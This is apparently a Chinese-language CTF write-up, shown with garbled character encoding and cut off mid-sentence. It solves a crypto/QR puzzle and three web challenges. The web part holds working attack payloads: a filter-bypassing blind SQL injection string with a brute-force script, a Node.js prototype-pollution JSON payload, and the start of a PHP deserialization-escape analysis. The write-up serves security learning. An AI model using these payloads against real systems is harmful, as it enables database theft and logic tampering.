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 ç„¶åæ‹¿è¿™ä¸ªå» https://tool.oschina.net/encrypt åœ¨çº¿è§£å¯†ï¼ŒAESï¼Œå¯†é’¥ä¸º apacheã€‚ æˆ–è€… openssl è§£å¯† ï¼ˆè¿™å‚æ•°è°çŸ¥é“å°±æ˜¯ aes256 å‘¢ï¼Œéš¾ä¸æˆçˆ†ç ´ï¼Ÿï¼‰ å…ˆæŠŠä¸Šé¢çš„å¯†æ–‡å­˜åˆ° enc.txtï¼Œè€Œåæ‰§è¡Œä¸‹é¢çš„è¿™ä¸ªï¼Œè¾“å‡ºä¿å­˜åˆ° out.txt æ–‡ä»¶ä¸­ã€‚ cat enc.txt | base64 -d | openssl enc -aes256 -salt -d -out out.txt -pass pass:apache -md md5 å¦å¤–å¤§ä½¬æé†’è¯´ï¼Œopenssl 1.1ç‰ˆæœ¬ä»¥ä¸Šé»˜è®¤çš„hashä¸æ˜¯md5ï¼Œä½ç‰ˆæœ¬çš„æ˜¯md5ã€‚ å¾—åˆ°ä¸€å †çš„01å­—ç¬¦ä¸²ï¼Œä¼°è®¡å°±æ˜¯äºŒç»´ç äº†å•¦ï¼ ç»Ÿè®¡ä¸€ä¸‹é•¿åº¦ä¸º4900ï¼Œæ­£å¥½70*70. å†™ä¸ªä¸‘é™‹çš„jioæœ¬æŠŠäºŒç»´ç ç”»å‡ºæ¥ã€‚ from PIL import Image import numpy as np table = np.zeros((70, 70), dtype=int) i = 0 for row in range(70): for j in range(70): if s[i] == '1': table[row][j] = 1 else: table[row][j] = 0 i += 1 a = [[0 if b == 0 else 255 for b in row] for row in table] qrcode = Image.fromarray(np.uint8(np.array(a))) qrcode.show() qrcode.save(r\"./qr.png\") å¾—åˆ°äºŒç»´ç å¦‚ä¸‹ã€‚ æ‰«ç å¾—åˆ° flagã€‚ flag{lakks1qw23eeeaw345tywqiqajsajdwajdai} ï¼ˆå¯»æ€ç€ç°åœºæ–­ç½‘ç¯å¢ƒåšå‡ºæ¥ä¹Ÿå¤ªå¼ºäº†å§ï¼Œæ€•ä¸æ˜¯ openssl å‚æ•°æŒæ¡çš„å¾ˆç†Ÿç»ƒï¼Œè¦ä¸ç„¶å°±æ˜¯å·å·ä¸Šç½‘äº†ï¼Ÿ ï¼ˆMisc ç¢°ä¸Š Crypto å°±å¾ˆå¤´ç§ƒ ï¼ˆå°å£°bb WebWeb1 ezsql&lt;h1&gt;Get The Flag&lt;/h1&gt; &lt;!-- $query = \"SELECT * FROM fake_flag WHERE id = $id limit 0,$limit\"; //$query = \"SELECT flag FROM real_flag WHERE id = $id limit 0,$limit\"; --&gt; &lt;form method=\"get\" class=\"form-group\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col-md-1\"&gt; yourt id &lt;/div&gt; &lt;div class=\"col-md-4\"&gt; &lt;input type=\"text\" name=\"id\" class=\"form-control\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;input type=\"text\" name=\"limit\" hidden=\"\" value=\"1\"&gt; &lt;div class=\"row\"&gt; &lt;input type=\"submit\" value=\"get it\" class=\"btn\" btn-info=\"\"&gt; &lt;/div&gt; &lt;/form&gt; æ˜¯é“ SQL æ³¨å…¥çš„é¢˜ã€‚æ ¹æ®æç¤ºçœŸæ­£çš„ flag åœ¨ real_flag è¿™ä¸ªè¡¨é‡Œï¼Œä¸”å­—æ®µåä¸º flagï¼Œéœ€è¦é€šè¿‡ id å’Œ limit è¿™ä¸¤ä¸ªå‚æ•°æ¥æ³¨å…¥ã€‚ ç°åœºè¯•äº†å‘ç°ä¸€å †å…³é”®å­—éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼ŒUNIONã€SUBSTR ä¸å¯è¡Œï¼Œ' \" /**/ () ç­‰ç­‰éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œåªèƒ½ç›²æ³¨äº†ã€‚ ç„¶è€Œè¯•äº†å¾ˆå¤šéƒ½æ²¡è¢«è¿‡æ»¤äº†è‰â€¦â€¦ æœ€å fix çš„æ—¶å€™å‘ç°è¯»å–æ•°æ®åº“ç›¸å…³çš„æºç é•¿ä¸‹é¢è¿™æ ·ã€‚ function is_safe($id, $limit){ $common_blacklist = [\"!\", \"\\\"\", \"#\", \"%\", \"&amp;\", \"'\", \";\", \"&lt;\", \"=\", \"&gt;\", \"\\\\\", \"^\", \"`\", \"|\" ,'between','not',\" \",\"like\",',']; $hack_list = ['union','join','in',\"/**/\",\"substr\",\"ascii\",\"left\",\"right\"]; $id_blacklist = ['left','right','like','(',')']; $limit_blacklist = ['-']; $blacklist = array_merge ($common_blacklist, $hack_list, $id_blacklist); foreach ($blacklist as $value) { if (stripos($id, $value) !== false) die(\"your param &lt;b&gt;id&lt;/b&gt; look like dangerous!\"); } $blacklist = array_merge ($common_blacklist, $hack_list, $limit_blacklist); foreach ($blacklist as $value) { if (stripos($limit, $value) !== false) die(\"your param &lt;b&gt;limit&lt;/b&gt; look like dangerous!\"); } if( $limit &gt; 10 or $limit &lt;= 0) { die(\"your param limit can't &gt;10 or &lt;=0\"); } return true; } if(isset($_GET[\"id\"]) &amp;&amp; isset($_GET['limit'])){ $id = $_GET[\"id\"]; $limit = $_GET['limit']; if(!is_safe($id, $limit)){ exit(\"stop , hack!\"); } $query = \"SELECT * FROM fake_flag WHERE id = $id limit 0,$limit\"; $result = $mysqli-&gt;query($query); if ($result === false) { die(\"database error, please check your input\"); } //var_dump($result); $row = $result-&gt;fetch_assoc(); if($row === NULL){ echo \"searched nothing\"; }else { var_dump($row); } while ($row = $result-&gt;fetch_assoc()) { var_dump($row); } $result-&gt;free(); $mysqli-&gt;close(); } ä¹Ÿå°±æ˜¯è¯´ id è¿‡æ»¤äº†æ‹¬å·ï¼Œlimit è¿‡æ»¤äº† -ï¼Œä½†å¯ä»¥åè¿‡æ¥ï¼Œä¸”èƒ½ç”¨ \\t ä»£æ›¿ç©ºæ ¼ï¼Œç”¨ ord ä»£æ›¿ asciiï¼Œå°±å¯ä»¥ å¸ƒå°”ç›²æ³¨ äº†ã€‚ ç¾¤é‡Œå¤§ä½¬çš„ payload: id=1\\tor\\t{x}-/*' &amp;limit='10\\tnana*/ord((select\\tgroup_concat(flag)\\tfrom\\treal_flag)) æ„é€ å‡ºæ¥çš„ SQL è¯­å¥é•¿è¿™æ ·ã€‚ SELECT * FROM fake_flag WHERE id = 1\\tor\\t{x}-/*' limit 0, '10\\tnana*/ord((select\\tgroup_concat(flag)\\tfrom\\treal_flag)) å…¶ä¸­ï¼Œordå‡½æ•°è¿”å›çš„æ˜¯å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼ï¼Œgroup_concatå‡½æ•°è¿”å›å¸¦æœ‰æ¥è‡ªä¸€ä¸ªç»„çš„è¿æ¥çš„éNULLå€¼çš„å­—ç¬¦ä¸²ç»“æœï¼Œä¹Ÿå°±æ˜¯æŠŠflagå­—æ®µçš„æ•°æ®ï¼ˆé»˜è®¤ç”¨ , ï¼‰åˆå¹¶èµ·æ¥ã€‚ fake_flag ä¸­æœ‰ä¸¤é¡¹ç»“æœï¼Œid åˆ†åˆ«å¯¹åº”ç€1å’Œ2ã€‚ å¦‚æœ or åé¢çš„è¡¨è¾¾å¼ä¸ºå‡ï¼Œå³è¯´æ˜ x å’Œ flag ä¸­çš„è¿™ä¸€ä½å¯¹ä¸Šäº†ï¼Œé‚£ä¹ˆæŸ¥è¯¢å‡ºæ¥çš„ç»“æœå°±åªæœ‰ä¸€é¡¹äº†ã€‚ å¦å¤–ï¼Œå‘ç°æ²¡æœ‰æ‹¦æˆª MIDï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ¥ç´¢å¼• flagã€‚ äºæ˜¯è¿›ä¸€æ­¥æ„é€  SQL è¯­å¥ï¼š SELECT * FROM fake_flag WHERE id = 1\\tor\\t{x}-/*' limit 0, '10\\tnana*/ord((select\\tMID(group_concat(flag),2)\\tfrom\\treal_flag)) æ‰€ä»¥å¤§æ¦‚å°±éå†ä¸€ä¸‹ x çš„å–å€¼ï¼Œä»è€ŒæŠŠ flag çˆ†ç ´å‡ºæ¥ã€‚ æ¯”å¦‚æœ¬åœ°è¯•ä¸€è¯•ï¼Œæ¯”å¦‚ f å¯¹åº” ASCII ä¸º 102ï¼Œæ­¤æ—¶åªæœ‰ä¸€ä¸ªç»“æœã€‚ å½“ç„¶ä¹Ÿå¯ä»¥è®¾ç½® id ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„å€¼ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹æŸ¥è¯¢ä¸åˆ°ç»“æœã€‚ SELECT * FROM fake_flag WHERE id = 5\\tor\\t{x}-/*' limit 0, '10\\tnana*/ord((select\\tMID(group_concat(flag),2)\\tfrom\\treal_flag)) åŠ å…¥æ³¨å…¥è¯­å¥åï¼Œå¦‚æœ x å’Œ flag ä¸­çš„ç›¸åº”ä½ç½®å­—ç¬¦æ²¡å¯¹åº”ä¸Šï¼Œåˆ™ or ä¹‹åçš„è¡¨è¾¾å¼ç»“æœä¸ä¸º0ï¼Œå³ä¸ºçœŸï¼Œé‚£ä¹ˆæŸ¥è¯¢æ—¶å°†æœ‰ç»“æœè¿”å›ï¼› è€Œå­—ç¬¦å¯¹åº”ä¸Šçš„è¯ï¼Œè¡¨è¾¾å¼ç»“æœä¸º0ï¼Œor å‡ºæ¥ç»“æœéƒ½ä¸ºå‡ï¼Œäºæ˜¯å°±æŸ¥è¯¢ä¸åˆ°ç»“æœã€‚ è¿™æ ·ä¹Ÿèƒ½å®ç°å¸ƒå°”ç›²æ³¨ã€‚ å‚è€ƒç½‘ä¸Šjioæœ¬æ”¹äº†æ”¹ï¼šï¼ˆå¤§æ¦‚é€»è¾‘è¿™æ ·ï¼Œæœªå®é™…æµ‹è¯• import requests import string mystring = string.printable # æ‰€æœ‰å¯è§å­—ç¬¦ url = \"http://URL/\" url += \"?id=5\\tor\\t{0}-/*'&amp;limit='10\\tnana*/ord((select\\tmid(group_concat(flag),{1})\\tfrom\\treal_flag))\"\" reply = \"searched nothing\" print(url) count = 1 result = '' while True: temp_result = result for char in mystring: response = requests.post(url.format(ord(char), count)) if reply in response.content: result += char print(result + '......') break if result == temp_result: print('Complete!') break count+=1 ï¼ˆå®³ï¼Œè¿˜æ˜¯å¤ªèœäº†ï¼Œè¿å¸ƒå°”ç›²æ³¨éƒ½ä¸ä¼šå˜¤å˜¤å˜¤ Web2 battleæ˜¯ä¸€é“ Node.js çš„é¢˜ã€‚ éƒ¨åˆ†æºç ï¼š function getPlayerDamageValue() //è®¡ç®—çº¯ç²¹ä¼¤å®³ { if (player.buff) { return keepTwoDecimal(player.aggressivity+player.buff) } else return player.aggressivity } function triggerPassiveSkill() //è§¦å‘è¢«åŠ¨æŠ€èƒ½ { switch (player.career) { case \"warrior\": player.buff = 5 return 1 case \"high_priest\" : player.HP += 10 player.HP = keepTwoDecimal(player.HP) return 2 case 'shooter' : player.buff = 7 return 3 default: return 0 } } function playerUseItem(round) { //ZLYGï¼šæ²»ç–—è¯è†ï¼Œä½¿ç”¨åå›å¤10ç‚¹ç”Ÿå‘½å€¼ //BYZFï¼šç™½é“¶ä¹‹é”‹ï¼Œä½¿ç”¨åçš„ä¸€æ¬¡æ”»å‡»å°†è§¦å‘æš´å‡»å¹¶é€ æˆ130%çš„ä¼¤å®³ //XELDï¼šé‚ªæ¶é•°åˆ€ï¼Œä½¿ç”¨åå°†å¯¹æ–¹çš„ä¸€æ¬¡æ”»å‡»çš„æ”»å‡»åŠ›å˜ä¸º80% if (round == player.round_to_use &amp;&amp; player.num == 1) { player.num = 0; switch (player.item) { case \"ZLYG\": player.HP += 10; return 1; case \"BYZF\": player.buff = player.aggressivity * 0.3; player.buff = keepTwoDecimal(player.buff) return 2; case \"XELD\": monster.buff = monster.aggressivity * (1 - 0.8) * (-1); monster.buff = keepTwoDecimal(monster.buff) return 3; } } else return 0 } function playerAttackMonster() { monster.HP -= (getPlayerDamageValue()) monster.HP = keepTwoDecimal(monster.HP) } function monsterAttackPlayer() { if (monster.buff) { player.HP -= (monster.aggressivity + monster.buff) player.HP = keepTwoDecimal(player.HP) return keepTwoDecimal(monster.aggressivity + monster.buff) } else { player.HP -= monster.aggressivity player.HP = keepTwoDecimal(player.HP) return monster.aggressivity } } //...... app.post('/start', (req, res) =&gt; { if (req.body &amp;&amp; typeof req.body== 'object' ) { player = { name : \"ciscn\", career : \"warrior\", item : \"BYZF\", round_to_use : 1 //round_to_useè¡¨ç¤ºåœ¨å“ªä¸€è½®ä½¿ç”¨ç‰©å“ } let tempPlayer = req.body for ( let i in tempPlayer ) { if (player[i]) { if ( (i == 'career' &amp;&amp; !careers.includes(tempPlayer[i])) || (i == 'item' &amp;&amp; !items.includes(tempPlayer[i])) || (i == 'round_to_use' &amp;&amp; !checkRound(tempPlayer[i])) || tempPlayer[i] === '') { continue } player[i] = tempPlayer[i] } } player.num = 1; //playerå‰©ä½™å¯`ä½¿ç”¨ç‰©å“`çš„æ¬¡æ•° player.HP = 100; //HPä¸ºè¡€é‡ player.aggressivity = getPlayerAggressivity() initMonster() res.redirect(\"/battle\") } else { res.redirect(\"/\") } }) app.get('/battle', (req, res)=&gt;{ if ( player.HP !== 100 ) { res.status(403).end(\"Forbidden\") return } let battleLog = [] let round = 1; do { battleLog.push(`&lt;font color=\"red\" size=\"5px\"&gt;Round &lt;B&gt;${round}&lt;/B&gt; fight!&lt;/font&gt;`) player.aggressivity = getPlayerAggressivity(); battleLog.push(`${playerAndMonsterInfo()}ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;æ”»å‡»åŠ›ä¸º&lt;B&gt;${getPlayerDamageValue()}&lt;/B&gt;!`) switch (playerUseItem(round)) { case 0: break case 1: battleLog.push(`ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;ä½¿ç”¨äº†ç‰©å“&lt;B&gt;æ²»ç–—è¯è†&lt;/B&gt;! ç©å®¶ç”Ÿå‘½å€¼+10ï¼`) break case 2: battleLog.push(`ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;ä½¿ç”¨äº†ç‰©å“&lt;B&gt;ç™½é“¶ä¹‹é”‹&lt;/B&gt;! å³å°†é€ æˆ130%æš´å‡»ï¼`) break case 3: battleLog.push(`ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;ä½¿ç”¨äº†ç‰©å“&lt;B&gt;é‚ªæ¶é•°åˆ€&lt;/B&gt;! &lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;çš„æ”»å‡»åŠ›å˜ä¸ºäº†80%ï¼`) break } if (round === 1) { switch (triggerPassiveSkill()) { case 1: battleLog.push(`ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;è§¦å‘äº†&lt;B&gt;æˆ˜ç¥é¢†ä¸»&lt;/B&gt;çš„è¢«åŠ¨æŠ€èƒ½&lt;B&gt;æ—‹é£é£æ–§&lt;/B&gt;! ä¸‹æ¬¡æ”»å‡»çš„æ”»å‡»åŠ›+5ï¼`) break case 2: battleLog.push(`ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;è§¦å‘äº†&lt;B&gt;å¥¥æœ¯ç¥­å¸&lt;/B&gt;çš„è¢«åŠ¨æŠ€èƒ½&lt;B&gt;å·«æ¯’æ¢å¤&lt;/B&gt;! ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;çš„ç”Ÿå‘½å€¼+10ï¼`) break case 3: battleLog.push(`ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;è§¦å‘äº†&lt;B&gt;æš—å¤œæ¸¸ä¾ &lt;/B&gt;çš„è¢«åŠ¨æŠ€èƒ½&lt;B&gt;ç™¾æ­¥ç©¿æ¨&lt;/B&gt;! ä¸‹æ¬¡æ”»å‡»çš„æ”»å‡»åŠ›+7ï¼`) } } playerAttackMonster() battleLog.push(`ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;æ”»å‡»äº†&lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;å¹¶é€ æˆ&lt;B&gt;${getPlayerDamageValue()}&lt;/B&gt;ç‚¹ä¼¤å®³! &lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;å‰©ä½™è¡€é‡ä¸º&lt;B&gt;${monster.HP}&lt;/B&gt;`) if (monster.HP &lt;= 0) { battleLog.push(' ') break } if (monsterPassiveSkill()){ battleLog.push(`&lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;è§¦å‘äº†è¢«åŠ¨æŠ€èƒ½&lt;B&gt;ç¼©åœ°&lt;/B&gt;ï¼ç”Ÿå‘½å€¼å›å¤20ç‚¹ï¼å›å¤åç”Ÿå‘½å€¼ä¸º&lt;B&gt;${monster.HP}&lt;/B&gt;`) } battleLog.push(`&lt;B&gt;åœ°ç©´é¢†ä¸»&lt;/B&gt;æ”»å‡»äº†ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;å¹¶é€ æˆ&lt;B&gt;${monsterAttackPlayer()}&lt;/B&gt;ç‚¹ä¼¤å®³! ç©å®¶&lt;B&gt;${player.name}&lt;/B&gt;å‰©ä½™è¡€é‡ä¸º&lt;B&gt;${player.HP}&lt;/B&gt;`) monster.aggressivity = 40; monster.buff = 0; player.buff = 0; round++ battleLog.push(' ') } while (player.HP &gt; 0 &amp;&amp; monster.HP &gt; 0) if (player.HP &gt; monster.HP) { battleLog.push(\"æ­å–œä½ èƒœåˆ©äº†ï¼è¿™æ˜¯ç»™ä½ çš„å¥–åŠ±ï¼š\" + flag) } else { battleLog.push(\"å¾ˆé—æ†¾ï¼Œä½ è¢«æ‰“è´¥äº†ï¼Œä½†æ˜¯ä¸è¦ç°å¿ƒï¼Œå†æ¥å†å‰\") } player = monster = {} res.render(\"result\", {\"result_5be4038eaf61b1b7abad92cfece05cd7\" : battleLog.join(\"&lt;br /&gt;\\n\")}) }) å‡º flag éœ€è¦ player.HP &gt; monster.HPï¼Œä½†ä¸èƒ½ç›´æ¥æ”¹ player.HPã€‚ ä¸è¿‡å¯ä»¥åŠ å¤§ buffï¼Œå†çœ‹æºç ä¸­è¿™ä¸€éƒ¨åˆ†ã€‚ for ( let i in tempPlayer ) { if (player[i]) { if ( (i == 'career' &amp;&amp; !careers.includes(tempPlayer[i])) || (i == 'item' &amp;&amp; !items.includes(tempPlayer[i])) || (i == 'round_to_use' &amp;&amp; !checkRound(tempPlayer[i])) || tempPlayer[i] === '') { continue } player[i] = tempPlayer[i] } } è¿™é‡ŒæŠŠæ¥æ”¶åˆ°çš„ tempPlayer è¿™ä¸ª object ä¸­çš„ value ä¸ä¸ºç©ºå†…å®¹éƒ½èµ‹ç»™ player äº†ã€‚ äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ±¡æŸ“åŸå‹é“¾ï¼ŒæŠŠ buff æ”¹å¤§ã€‚ å¤§å¸ˆå‚…æœ‰è¨€ï¼š åŸå‹æ±¡æŸ“ï¼Œè™½ç„¶ä¸èƒ½æ±¡æŸ“åˆ°çœŸæ­£çš„åŸå‹ï¼Œä½†æ˜¯å¯ä»¥æ›¿æ¢ player å¯¹è±¡çš„åŸå‹åˆ°æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡ï¼Œå°† buff ææˆä¸€ä¸ªç‰¹åˆ«å¤§çš„å€¼å°±èƒ½ç§’æ€ bossã€‚ Payload: { \"name\": \"asdasd\", \"round_to_use\": 1, \"career\": \"high_priest\", \"item\": \"ZLYG\", \"__proto__\": { \"buff\": 1000 } } Web3ååºåˆ—åŒ–é€ƒé€¸ lib.php éƒ¨åˆ†æºç  User ç±» private function waf($string) { $waf = '/phar|file|gopher|http|sftp|flag/i'; return preg_replace($waf, 'index', $string); } private function check_data($data) { foreach( $data as $key =&gt; $value) { if ( is_array($value) ) return $this-&gt;check_data($value); if ( is_object($value) &amp;&amp; $value instanceof User) { $data_avatar = $value-&gt;get_avatar(); if ( is_string($data_avatar) &amp;&amp; !empty($data_avatar)) { $content = file_get_contents(__DIR__ . \"/\" . $data_avatar); $png_header = \"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\\x00\\x00\\x00\\x0D\\x49\\x48\\x44\\x52\"; if (strpos($content, $png_header) === false ) { throw new Exception(\"png content got an unexpected Exception\"); } } } } return true; } public function update($profile) { $data = unserialize($this-&gt;waf($profile)); if ($data[\"old_password\"] !== $data[\"old_real_password\"] ) return $this-&gt;check_data($data); $this-&gt;password = $data[\"password\"]; $this-&gt;age = $data[\"age\"]; $this-&gt;email = $data[\"email\"]; } //...... function __destruct() { if ( isset($this-&gt;username) &amp;&amp; isset($this-&gt;password) &amp;&amp; isset($this-&gt;age) &amp;&amp; isset($this-&gt;email) &amp;&amp; isset($this-&gt;avatar) &amp;&amp; isset($this-&gt;content) &amp;&amp; is_string($this-&gt;avatar) &amp;&amp; !empty($this-&gt;avatar) &amp;&amp; !preg_match('/\\:\\/\\//', $this-&gt;avatar) ) { $this-&gt;content = file_get_contents(__DIR__ . \"/\" . $this-&gt;avatar); $res = \"&lt;script&gt;\\nvar img = document.createElement(\\\"img\\\");\\nimg.src= \\\"data:image/png;base64,content\\\";\\nimg.alt = \\\"user\\\";\\ndocument.getElementById(\\\"pro-avatar\\\").append(img);\\n&lt;/script&gt;\"; $res = str_replace(\"content\", base64_encode($this-&gt;content), $res); echo $res; } } dashboard.php éƒ¨åˆ†æºç  if (isset($_POST[\"old_password\"]) &amp;&amp; isset($_POST[\"update_password\"]) &amp;&amp; isset($_POST[\"update_age\"]) &amp;&amp; isset($_POST[\"update_email\"]) &amp;&amp; is_string($_POST[\"old_password\"]) &amp;&amp; is_string($_POST[\"update_password\"]) &amp;&amp; is_string($_POST[\"update_age\"]) &amp;&amp; is_string($_POST[\"update_email\"]) ) { if ( preg_match('/[^\\d]/', $_POST[\"update_age\"]) || !filter_var($_POST[\"update_email\"], FILTER_VALIDATE_EMAIL) || strlen($_POST[\"update_password\"]) &gt; 16 || preg_match('/\\W/', $_POST[\"update_password\"]) ) $user-&gt;alertMes(\"invalid information\", \"./dashboard.php\"); $update_profile = array ( \"old_password\" =&gt; $_POST[\"old_password\"], \"old_real_password\" =&gt; $user-&gt;password, \"password\" =&gt; $_POST[\"update_password\"], \"age\" =&gt; $_POST[\"update_age\"], \"email\" =&gt; $_POST[\"update_email\"] ); $user-&gt;update(serialize($update_profile)); } åº”è¯¥æ˜¯è°ƒç”¨Userç±»çš„updateæ–¹æ³•æ—¶ç»è¿‡ waf å’Œ unserialize æ—¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ å¤§è€é¼ æœ‰è¨€ï¼š waf() é€ æˆåºåˆ—åŒ–çš„å­—ç¬¦ä¸²é•¿åº¦æ”¹å˜ï¼Œå°±å¯ä»¥æå‰æˆªæ–­äº† 